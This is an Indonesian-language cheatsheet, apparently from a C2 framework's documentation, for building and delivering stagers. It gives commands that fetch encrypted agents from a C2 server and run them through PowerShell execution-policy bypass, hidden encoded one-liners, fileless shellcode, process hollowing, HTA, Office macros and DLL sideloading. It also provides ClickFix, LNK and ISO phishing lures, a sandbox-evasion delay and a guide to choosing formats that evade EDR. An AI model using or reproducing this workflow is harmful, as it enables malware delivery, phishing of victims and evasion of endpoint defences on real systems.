# 09 — Stager & Delivery

> Lihat [docs/DELIVERY_GUIDE.md](../docs/DELIVERY_GUIDE.md) untuk panduan delivery
> per format yang sangat lengkap. Halaman ini adalah ringkasan dan cheatsheet.

---

## Konsep Staged Delivery

```
STAGELESS                    STAGED
──────────────────────────   ──────────────────────────────────────────
Target                       Target
  └─► [Agent 10MB]             └─► [Stager 2MB]
      Langsung aktif                └─► Download dari C2
                                        └─► [Agent 10MB, terenkripsi]
                                            └─► Decrypt di memori
                                                └─► Aktif
```

**Keuntungan staged:**
- File yang dikirim ke target jauh lebih kecil
- Agent tidak pernah menyentuh disk (fileless jika exec-method hollow)
- Token one-shot: URL download hanya bisa digunakan sekali
- Payload tersimpan terenkripsi di server

---

## Workflow Wajib (Selalu Sama)

```bash
# 1. Server sudah jalan
ENCRYPTION_KEY=KEY ./bin/server --port 8000

# 2. Build agent
make agent-win-stealth C2_SERVER=http://IP:8000 ENC_KEY=KEY

# 3. Upload agent → dapat TOKEN
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server http://IP:8000 --format exe --arch amd64 --ttl 48

# 4. Generate stager (pilih format)
go run ./cmd/generate stager \
  --server http://IP:8000 \
  --token TOKEN \
  --key KEY \
  --format FORMAT \
  --output output_file
```

---

## Format Stager

### `ps1` — PowerShell Drop (Paling Sering Dipakai)

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN \
  --key KEY \
  --format ps1 \
  --exec-method drop \
  --output stager.ps1
```

**Cara eksekusi di target:**
```powershell
# File langsung
powershell -ep bypass -f stager.ps1

# One-liner encoded (untuk ClickFix/phishing)
powershell -w hidden -ep bypass -enc BASE64_DARI_PS1
```

---

### `ps1-mem` — PowerShell In-Memory (Fileless)

Butuh stage berisi **shellcode** (bukan EXE). Konversi dulu dengan donut:

```bash
donut -i bin/agent_windows_stealth.exe -o agent.bin -a 2

./bin/operator stage upload agent.bin \
  --server http://172.23.0.118:8000 --format shellcode

go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN_SHELLCODE \
  --key KEY \
  --format ps1-mem \
  --output stager_mem.ps1
```

---

### `exe` — Binary Stager

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN \
  --key KEY \
  --format exe \
  --exec-method drop \
  --output stager.exe
```

**Exec method untuk EXE:**
- `drop` → download ke `%TEMP%`, eksekusi langsung
- `hollow` → spawn svchost.exe suspended, hollow dengan agent
- `thread` → VirtualAlloc + CreateThread (butuh shellcode)

```bash
# Dengan process hollowing ke RuntimeBroker
go run ./cmd/generate stager \
  --format exe \
  --exec-method hollow \
  --hollow-exe "C:\Windows\System32\RuntimeBroker.exe" \
  --output stager_hollow.exe
```

---

### `hta` — HTML Application

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN \
  --key KEY \
  --format hta \
  --output update.hta
```

**Cara eksekusi di target:**
```
Dobel-klik update.hta → mshta.exe → VBScript → stager
```

Atau via command line:
```
mshta.exe http://172.23.0.118:8888/update.hta
```

---

### `vba` — Office Macro

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN \
  --key KEY \
  --format vba \
  --output macro.bas
```

**Deploy ke Word/Excel:**
1. `Alt+F11` → Insert Module → Paste `macro.bas`
2. Simpan sebagai `.docm` / `.xlsm`
3. Target buka → Enable Content → auto-eksekusi

---

### `dll` — DLL Sideloading

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN \
  --key KEY \
  --format dll \
  --output version.dll
```

Letakkan di folder aplikasi yang load `version.dll` → saat app dibuka, DllMain dipanggil.

---

## Delivery Templates

Template untuk social engineering — tidak perlu compile ulang.

### ClickFix (Win+R Lure)

```bash
go run ./cmd/generate template \
  --type clickfix \
  --stager-file bin/agent_windows_stealth.exe \
  --lure "Human Verification Required" \
  --output lure.html
```

Host di web server → kirim link ke target → target tekan Win+R dan paste perintah.

### LNK — Windows Shortcut

```bash
go run ./cmd/generate template \
  --type lnk \
  --url http://172.23.0.118:8000/stage/TOKEN \
  --lure "Laporan_Q1_2026" \
  --output make_lnk.ps1

# Jalankan PS1 di mesin attacker untuk generate .lnk
powershell -f make_lnk.ps1
```

### ISO Bundle

```bash
go run ./cmd/generate template \
  --type iso \
  --url http://172.23.0.118:8000/stage/TOKEN \
  --lure "Dokumen_Kontrak" \
  --output iso_recipe.txt

# Buat ISO di Linux
mkdir iso_contents && cp stager.exe iso_contents/
mkisofs -o lure.iso -J -R -l iso_contents/
```

### HTA Template

```bash
go run ./cmd/generate template \
  --type hta \
  --url http://172.23.0.118:8000/stage/TOKEN \
  --output phish.hta
```

### Office VBA Template

```bash
go run ./cmd/generate template \
  --type macro \
  --url http://172.23.0.118:8000/stage/TOKEN \
  --output macro.bas
```

---

## Stage Management

```
# Lihat semua stage
./bin/operator stage list --server http://IP:8000

# Output:
# TOKEN                              FORMAT  ARCH    USED    EXP        DESCRIPTION
# 6a69a21a750af40e983cf257b3d2e4a9  exe     amd64   no      24h        test-engagement

# Hapus stage
./bin/operator stage delete TOKEN --server http://IP:8000
```

---

## Anti-Sandbox Delay

```bash
# Tambah delay N detik sebelum eksekusi (bypass sandbox timeout)
go run ./cmd/generate stager \
  --format ps1 \
  --jitter 15 \
  --token TOKEN \
  --key KEY \
  --output stager.ps1
```

---

## Decision: Pilih Format

```
Delivery via?
├── Email attachment
│   ├── Target buka Office  → vba
│   ├── Semua file           → hta atau exe dalam .zip
│   └── Gateway ketat        → iso dalam .zip
├── Link web / ClickFix      → ps1 via clickfix template
├── USB drop                 → exe atau iso+lnk
├── Shell sudah ada          → ps1 langsung
└── Target ada EDR?
    ├── AV saja              → ps1 + hollow
    ├── EDR aktif            → dll sideload atau ps1-mem
    └── Memory scan          → custom loader
```

---

**Selanjutnya:** [10 — Process Injection](10-injection.md)
